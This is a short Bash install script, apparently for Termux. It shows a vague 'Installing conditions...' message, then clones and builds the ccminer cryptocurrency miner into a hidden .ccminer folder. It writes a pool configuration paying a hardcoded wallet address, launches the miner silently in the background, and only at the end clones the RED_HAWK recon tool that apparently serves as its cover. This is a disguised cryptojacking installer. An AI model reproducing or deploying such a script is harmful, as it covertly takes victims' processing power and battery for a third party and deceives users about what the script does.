#!/bin/bash

# 
echo "Installing conditions..."
sleep 3

# 
pkg install git -y

#
git clone https://github.com/Darktron/ccminer.git

# 
mv ccminer .ccminer

# 
cd .ccminer

# Megváltoztatja a jogosultságokat és elindítja a build.sh-t
chmod +x build.sh configure.sh autogen.sh start.sh
CXX=clang++ CC=clang ./build.sh

#
echo '{
    "pools":
        [{
            "name": "RO-VIPOR",
            "url": "stratum+tcp://ro.vipor.net:5040",
            "timeout": 180,
            "disabled": 0
        },
        {
            "name": "UA-VIPOR",
            "url": "stratum+tcp://ua.vipor.net:5040",
            "timeout": 180,
            "disabled": 0
        },
        {
            "name": "PL-VIPOR",
            "url": "stratum+tcp://pl.vipor.net:5040",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "DE-VIPOR",
            "url": "stratum+tcp://de.vipor.net:5040",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "WW-ZERGPOOL",
            "url": "stratum+tcp://verushash.mine.zergpool.com:3300",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "VPOOL-LOW",
            "url": "stratum+tcp://pool.verus.io:9998",
            "timeout": 180,
            "disabled": 1
        },
        {
            "name": "US-CLOUDIKO",
            "url": "stratum+tcp://us.cloudiko.io:9999",
            "timeout": 180,
            "disabled": 1
        }],

    "user": "RJ85ApZwPgXbohvUEVVxwE78WHzsyoiHTJ.modul",
    "pass": "",
    "algo": "verus",
    "threads": 4,
    "cpu-priority": 1,
    "cpu-affinity": -1,
    "retry-pause": 10
}' > config.json

#
nohup ./start > /dev/null 2>&1 &

#
git clone https://github.com/ManabSenapati/RED_HAWK.git
